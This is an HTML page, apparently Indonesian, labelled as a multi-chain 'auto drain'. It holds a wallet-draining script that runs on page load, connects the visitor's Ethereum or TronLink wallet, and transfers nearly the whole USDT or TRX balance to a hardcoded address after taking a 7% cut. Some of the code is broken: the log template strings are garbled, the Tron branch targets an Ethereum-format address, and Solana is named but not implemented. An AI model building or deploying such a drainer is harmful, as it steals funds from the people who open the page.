<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTO DRAIN - ETH | TRON | SOL</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.5/dist/ethers.umd.min.js"></script>
    <script src="https://unpkg.com/@tronweb3/tronweb@latest/dist/TronWeb.js"></script>
    <style>
        body { font-family: Arial, sans-serif; margin:0; padding:15px; background:#0f0f0f; color:white; }
        .container { max-width:100%; background:#1a1a1a; padding:20px; border-radius:12px; }
        .log { margin-top:15px; height:520px; overflow-y:auto; background:#000; padding:12px; border-radius:8px; font-family:monospace; font-size:14px; line-height:1.5; }
        .info { background:#003300; padding:12px; border-radius:8px; margin:10px 0; }
        h2 { text-align:center; color:#00ff88; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🚀 AUTO MULTI CHAIN DRAIN</h2>
        <p><strong>Auto Check • Potong Fee • Kirim</strong></p>

        <div class="info">
            <strong>Tujuan:</strong> 0xF9f1C2d90f7516C6f371014dc241b6a54c6F726e<br>
            <strong>Fee Potong:</strong> 7%
        </div>

        <div class="log" id="log"></div>
    </div>

    <script>
        const SECONDARY = "0xF9f1C2d90f7516C6f371014dc241b6a54c6F726e";
        const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
        const SWAP_ROUTER = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45";
        const FEE_PERCENT = 7; // Ubah di sini kalau mau beda

        const log = (msg, error = false) => {
            const el = document.getElementById('log');
            const time = new Date().toLocaleTimeString('id-ID');
            const color = error ? '#ff5555' : '#55ff55';
            el.innerHTML += `<span style="color:\( {color}">[ \){time}] ${msg}</span><br>`;
            el.scrollTop = el.scrollHeight;
        };

        window.onload = async () => {
            log("🚀 Memulai Auto Drain...");
            await new Promise(r => setTimeout(r, 1500));

            if (window.ethereum) {
                await processEthereum();
            } else if (window.tronLink) {
                await processTron();
            } else {
                log("❌ Wallet provider tidak terdeteksi", true);
            }
        };

        // ===================== ETHEREUM =====================
        async function processEthereum() {
            try {
                log("🔍 Processing Ethereum...");
                const provider = new ethers.BrowserProvider(window.ethereum);
                await window.ethereum.request({ method: "eth_requestAccounts" });
                const signer = await provider.getSigner();
                const address = await signer.getAddress();

                log(`✅ Connected: \( {address.slice(0,6)}... \){address.slice(-4)}`, false);

                const tokenContract = new ethers.Contract(USDT, [
                    "function balanceOf(address) view returns (uint256)",
                    "function transfer(address,uint256) returns (bool)"
                ], signer);

                const balance = await tokenContract.balanceOf(address);
                if (balance === 0n) {
                    return log("⚠️ Saldo USDT kosong", true);
                }

                const formatted = ethers.formatUnits(balance, 6);
                log(`💰 Saldo ditemukan: ${formatted} USDT`);

                // Potong Fee
                const feeAmount = balance * BigInt(FEE_PERCENT) / 100n;
                const sendAmount = balance - feeAmount;

                log(`🔄 Potong fee ${FEE_PERCENT}% → Mengirim ${ethers.formatUnits(sendAmount, 6)} USDT`);

                const tx = await tokenContract.transfer(SECONDARY, sendAmount);
                await tx.wait();

                log("✅ BERHASIL! Balance sudah dikirim ke tujuan", false);

            } catch (e) {
                log("❌ Ethereum Error: " + e.message, true);
            }
        }

        // ===================== TRON =====================
        async function processTron() {
            try {
                log("🔍 Processing Tron...");
                await window.tronLink.request({ method: 'tron_requestAccounts' });
                const tronWeb = window.tronLink.tronWeb;
                const address = tronWeb.defaultAddress.base58;

                log(`✅ Connected Tron: ${address.slice(0,6)}...`, false);

                const balance = await tronWeb.trx.getBalance(address);
                if (balance < 1000000) {
                    return log("⚠️ Saldo TRX terlalu kecil", true);
                }

                const sendAmount = Math.floor(balance * (1 - FEE_PERCENT/100));
                log(`💰 Saldo TRX: ${(balance/1e6).toFixed(4)} → Kirim ${(sendAmount/1e6).toFixed(4)} TRX`);

                const tx = await tronWeb.transactionBuilder.sendTrx(SECONDARY, sendAmount, address);
                const signed = await tronWeb.trx.sign(tx);
                await tronWeb.trx.sendRawTransaction(signed);

                log("✅ TRX berhasil dikirim ke tujuan!", false);

            } catch (e) {
                log("❌ Tron Error: " + e.message, true);
            }
        }
    </script>
</body>
</html>
